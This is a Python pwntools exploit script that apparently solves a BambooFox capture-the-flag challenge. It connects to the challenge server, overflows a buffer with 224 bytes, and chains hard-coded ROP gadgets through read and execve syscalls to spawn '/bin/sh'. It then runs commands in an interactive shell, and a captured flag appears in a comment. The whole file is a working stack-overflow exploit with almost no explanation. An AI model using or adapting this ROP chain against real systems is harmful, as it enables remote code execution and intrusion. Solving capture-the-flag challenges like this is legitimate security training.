from pwn import *

#r=process('./infant-gogogo')
#nc bamboofox.cs.nctu.edu.tw 58795

host = "bamboofox.cs.nctu.edu.tw"
port = 58796
r = remote(host,port)
#r=process("./infant-gotoheaven")
#gdb.attach(r)

payload="A"*224


pop_rax_ret=0x0000000000404656
#0x000000000043e71d : xchg eax, edi ; ret

xchg_eax_edi=0x000000000043e71d
syscall=0x00000000004553e9

#0x00000000004143ed : pop rdx ; xor ah, byte ptr [rsi - 9] ; ret

#0x0000000000408497 : pop rsi ; dec dword ptr [rax + 0x21] ; ret

pop_rdx_ret=0x00000000004143ed
pop_rsi_ret=0x0000000000408497
bss=0x0057d000+0x300

#read
#rax=0x0
#rdi=fd=0
#rsi=buf ok
#rdx size ok
payload+=p64(pop_rax_ret)+p64(bss+0x300)+p64(pop_rsi_ret)+p64(bss+0x300)+p64(pop_rdx_ret)+p64(0x8)+p64(pop_rsi_ret)+p64(bss+0x200)+p64(pop_rax_ret)+p64(0x0)+p64(xchg_eax_edi)+p64(pop_rax_ret)+p64(0)+p64(syscall)


payload+=p64(pop_rax_ret)+p64(bss+0x300)+p64(pop_rsi_ret)+p64(bss+0x300)+p64(pop_rdx_ret)+p64(0x0)+p64(pop_rsi_ret)+p64(0)+p64(pop_rax_ret)+p64(bss+0x200)+p64(xchg_eax_edi)+p64(pop_rax_ret)+p64(0x3b)+p64(syscall)

sleep(1)

r.sendline(payload)
sleep(1)

r.sendline("/bin/sh\x00")

r.sendline("ls -al")

r.interactive()
#BAMBOOFOX{GOLANG_PWnnnnnnnIng_iS_r3A11Y_W3iRdO_O}

#execve
#rax=0x3b
#rdi bash
#rsi =0 ok
#rdx=0 ok
